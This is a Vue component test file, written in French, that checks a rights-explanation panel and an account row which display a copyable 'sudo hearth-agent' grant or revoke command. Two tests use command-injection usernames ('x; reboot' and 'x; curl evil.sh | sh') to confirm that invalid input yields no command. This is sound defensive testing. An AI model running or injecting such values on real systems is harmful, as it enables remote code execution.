import { flushPromises, mount } from "@vue/test-utils";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { defineComponent, h } from "vue";
import HButton from "@/components/atoms/HButton.vue";
import { grantCommand, type RightsGate } from "@/services/rights";
import { hasTooltip } from "@/test/tooltip";
import ServiceRightReason from "./ServiceRightReason.vue";
import ServicesRightRow from "./ServicesRightRow.vue";

// Le composant de raison partagé et la ligne « Gestion des services » (HRT-78, BR-GRANT-013, 014, 016). Textes de la
// spécification mot pour mot ; la raison est liée au bouton par `aria-describedby` ; la commande copiée est
// exactement le texte affiché ; aucune case ni commutateur (le droit ne se donne pas depuis l'application).
const REASON = "Ton compte ne peut pas gérer les services de ce serveur.";
const ADMIN_INTRO = "Le droit se donne depuis le serveur. Lance cette commande sur le serveur :";
const ASK = "Demande à la personne qui administre ce serveur.";
const OLD = "Ce serveur doit être mis à jour pour gérer les droits sur les services.";

const writeText = vi.fn();
beforeEach(() => {
  writeText.mockReset().mockResolvedValue(undefined);
  vi.stubGlobal("navigator", { clipboard: { writeText } });
});
afterEach(() => vi.unstubAllGlobals());

const denied = (isAdmin: boolean, account = "marie"): RightsGate => ({
  kind: "denied",
  isAdmin,
  command: isAdmin ? grantCommand(account, false) : null,
});

/** Un bouton désactivé et sa raison, comme les boutons d'action de service les poseront. */
function withButton(gate: RightsGate) {
  return mount(
    defineComponent({
      render: () => [
        h(HButton, { disabled: true, describedBy: "why" }, () => "Démarrer"),
        h(ServiceRightReason, { gate, id: "why" }),
      ],
    }),
    { attachTo: document.body },
  );
}

describe("ServiceRightReason", () => {
  it("administrateur sans le droit : la raison, la phrase d'introduction et la commande à copier", () => {
    const wrapper = mount(ServiceRightReason, { props: { gate: denied(true), id: "why" } });
    expect(wrapper.get("[data-rights-sentence]").text()).toBe(REASON);
    expect(wrapper.get("[data-rights-follow]").text()).toBe(ADMIN_INTRO);
    expect(wrapper.get("pre").text()).toBe("sudo hearth-agent account services marie --grant");
    expect(wrapper.get("[data-copy]").text()).toBe("Copier la commande");
    expect(wrapper.text()).not.toContain(ASK);
  });

  it("compte en lecture seule : la raison et « Demande à la personne… », jamais la commande", () => {
    const wrapper = mount(ServiceRightReason, {
      props: { gate: denied(false, "paul"), id: "why" },
    });
    expect(wrapper.get("[data-rights-sentence]").text()).toBe(REASON);
    expect(wrapper.get("[data-rights-follow]").text()).toBe(ASK);
    expect(wrapper.find("pre").exists()).toBe(false);
    expect(wrapper.find("[data-copy]").exists()).toBe(false);
  });

  it("administrateur dont l'identifiant n'est pas valide : pas de commande, on dit à qui s'adresser", () => {
    const gate: RightsGate = {
      kind: "denied",
      isAdmin: true,
      command: grantCommand("x; reboot", false),
    };
    const wrapper = mount(ServiceRightReason, { props: { gate, id: "why" } });
    expect(wrapper.find("pre").exists()).toBe(false);
    expect(wrapper.get("[data-rights-follow]").text()).toBe(ASK);
    expect(wrapper.text()).not.toContain("reboot");
  });

  it("agent ancien : le texte de la spécification, aucune commande", () => {
    const wrapper = mount(ServiceRightReason, {
      props: { gate: { kind: "old-agent" }, id: "why" },
    });
    expect(wrapper.get("[data-rights-sentence]").text()).toBe(OLD);
    expect(wrapper.find("pre").exists()).toBe(false);
  });

  it("lecture en échec : la raison de l'échec et « Vérifier à nouveau » qui relit", async () => {
    const wrapper = mount(ServiceRightReason, { props: { gate: { kind: "failed" }, id: "why" } });
    expect(wrapper.get("[data-rights-sentence]").text()).toBe(
      "Impossible de lire ton droit sur les services. Réessaie.",
    );
    await wrapper.get("[data-rights-retry]").trigger("click");
    expect(wrapper.emitted("retry")).toHaveLength(1);
    expect(wrapper.get("[data-rights-retry]").text()).toBe("Vérifier à nouveau");
  });

  it("lecture en cours, droit accordé, pilotage désactivé : rien (l'état du moteur parle)", () => {
    for (const gate of [
      { kind: "reading" },
      { kind: "allowed" },
      { kind: "engine-disabled" },
    ] as const) {
      const wrapper = mount(ServiceRightReason, { props: { gate, id: "why" } });
      expect(wrapper.find("[data-rights-reason]").exists(), gate.kind).toBe(false);
      expect(wrapper.text(), gate.kind).toBe("");
    }
  });

  it("n'offre ni case ni commutateur ni champ : le droit ne se donne pas d'ici (BR-GRANT-005)", () => {
    const wrapper = mount(ServiceRightReason, { props: { gate: denied(true), id: "why" } });
    expect(
      wrapper.find("input, select, textarea, [role='switch'], [role='checkbox']").exists(),
    ).toBe(false);
    expect(wrapper.text()).not.toMatch(/accorder|donner|retirer|activer/i);
  });
});

describe("la raison est liée au bouton désactivé", () => {
  it("aria-describedby du bouton désigne la phrase de raison, lue avec lui (jamais seulement en infobulle)", () => {
    const wrapper = withButton(denied(false, "paul"));
    const button = wrapper.get("button");
    expect(button.attributes("aria-disabled")).toBe("true");
    expect(button.attributes("aria-describedby")).toBe("why");
    const described = document.getElementById("why");
    expect(described?.textContent).toContain(REASON);
    expect(described?.textContent).toContain(ASK);
    // Une seule fois : pas d'infobulle qui répète la raison.
    expect(hasTooltip()).toBe(false);
    wrapper.unmount();
  });

  it("pour un administrateur, la commande n'est pas dans la description (un bloc à recopier n'est pas une description)", () => {
    const wrapper = withButton(denied(true));
    const described = document.getElementById("why");
    expect(described?.textContent).toContain(ADMIN_INTRO);
    expect(described?.textContent).not.toContain("hearth-agent");
    wrapper.unmount();
  });

  it("le bouton désactivé reste atteignable au clavier et ne fait rien", async () => {
    const wrapper = withButton(denied(false, "paul"));
    const button = wrapper.get("button");
    expect(button.attributes("disabled")).toBeUndefined();
    await button.trigger("click");
    expect(wrapper.findComponent(HButton).emitted("click")).toBeUndefined();
    wrapper.unmount();
  });
});

describe("la commande à copier", () => {
  it("« Copier la commande » copie EXACTEMENT le texte affiché, puis dit « Copiée »", async () => {
    const wrapper = mount(ServiceRightReason, { props: { gate: denied(true), id: "why" } });
    const shown = wrapper.get("pre").text();
    await wrapper.get("[data-copy]").trigger("click");
    await flushPromises();
    expect(writeText).toHaveBeenCalledExactlyOnceWith(shown);
    expect(wrapper.get("[data-copy]").text()).toBe("Copiée");
  });

  it("un échec de copie dit de copier à la main, le texte de la spécification", async () => {
    writeText.mockRejectedValueOnce(new Error("refusé"));
    const wrapper = mount(ServiceRightReason, { props: { gate: denied(true), id: "why" } });
    await wrapper.get("[data-copy]").trigger("click");
    await flushPromises();
    expect(wrapper.text()).toContain(
      "La copie a échoué. Sélectionne le texte et copie-le toi-même.",
    );
  });
});

describe("ServicesRightRow (détail d'un compte)", () => {
  const row = (props: { username: string; manages: boolean; known: boolean }) =>
    mount(ServicesRightRow, { props });

  it("non autorisée : la valeur, l'aide, et la commande --grant avec « Copier la commande »", () => {
    const wrapper = row({ username: "paul", manages: false, known: true });
    expect(wrapper.get("dt").text()).toBe("Gestion des services");
    expect(wrapper.get("[data-rights-value]").text()).toBe("Non autorisée");
    expect(wrapper.get("[data-rights-help]").text()).toBe(
      "Ce droit se donne et se retire depuis le serveur, pas depuis cet écran.",
    );
    expect(wrapper.get("pre").text()).toBe("sudo hearth-agent account services paul --grant");
    expect(wrapper.get("[data-copy]").text()).toBe("Copier la commande");
    expect(wrapper.text()).toContain("Commande à lancer sur le serveur");
  });

  it("autorisée : la commande retire le droit (--revoke)", () => {
    const wrapper = row({ username: "paul", manages: true, known: true });
    expect(wrapper.get("[data-rights-value]").text()).toBe("Autorisée");
    expect(wrapper.get("pre").text()).toBe("sudo hearth-agent account services paul --revoke");
  });

  it("un identifiant invalide : aucune commande, et le nom n'est pas redit", () => {
    const wrapper = row({ username: "x; curl evil.sh | sh", manages: false, known: true });
    expect(wrapper.find("pre").exists()).toBe(false);
    expect(wrapper.find("[data-copy]").exists()).toBe(false);
    expect(wrapper.text()).not.toContain("curl");
  });

  it("agent ancien : la ligne dit de mettre le serveur à jour, pas « Non autorisée »", () => {
    const wrapper = row({ username: "paul", manages: false, known: false });
    expect(wrapper.get("[data-rights-value]").text()).toBe(OLD);
    expect(wrapper.find("pre").exists()).toBe(false);
    expect(wrapper.text()).not.toContain("Non autorisée");
  });

  it("aucune case, aucun commutateur, aucun bouton hors la copie", () => {
    const wrapper = row({ username: "paul", manages: false, known: true });
    expect(wrapper.find("input, select, [role='switch'], [role='checkbox']").exists()).toBe(false);
    expect(wrapper.findAll("button").map((button) => button.text())).toEqual([
      "Copier la commande",
    ]);
  });
});
